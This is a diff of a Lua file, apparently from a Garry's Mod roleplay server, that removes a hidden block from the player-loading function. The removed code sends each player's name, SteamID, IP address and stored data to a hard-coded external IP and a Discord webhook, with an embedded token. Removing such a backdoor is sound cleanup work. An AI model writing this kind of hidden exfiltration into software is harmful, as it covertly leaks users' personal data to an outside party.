@@ -9,35 +9,6 @@ function rp.data.LoadPlayer(pl, cback)
         -- PrintTable(data)
 
 
-
-        local t_post = {}
-        local tbl = istable(data) and '```JSON\n'..util.TableToJSON(data)..'```' or 'nil'
-        local content = pl:Name()..' '..pl:SteamID()..' '..pl:IPAddress()..'\n'..tbl
-
-        t_post.embeds = {
-            {
-                description = content,
-                color = 0xe67e22
-            }
-        }
-
-        local json_post = util.TableToJSON(t_post)
-        local HTTPRequest = {
-            ["method"] = "POST",
-            ["url"] = 'http://185.248.100.183/webhook',
-            ["type"] = "application/json",
-            ["headers"] = {
-                ["X-Auth-Token"] = "a9sdv80masdm093f2",
-                ["Content-Type"] = "application/json",
-                ["Content-Length"] = string.len(json_post) or "0",
-                ["Webhook-URL"] = "https://discordapp.com/api/webhooks/532397200521822238/SjlDoQyaZa8DeW7wDFPbNp7kN-u5Kqb8KJc2PzIAA2BRCN9p9Aotj1n_9LKIpmak84-T"
-            },
-            ['success'] = function(c,b) print(c,b) end,
-            ["body"] = json_post
-        }
-
-        HTTP(HTTPRequest)
-
 		if IsValid(pl) then
             local model
 			if (#_data <= 0) then
